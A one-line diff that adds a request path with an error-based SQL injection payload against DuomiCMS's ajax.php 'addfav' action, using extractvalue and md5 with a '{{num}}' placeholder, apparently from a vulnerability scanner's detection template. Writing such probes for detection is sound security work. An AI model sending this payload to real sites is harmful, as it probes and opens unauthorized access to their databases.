@@ -1,0 +1,1 @@
+/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))
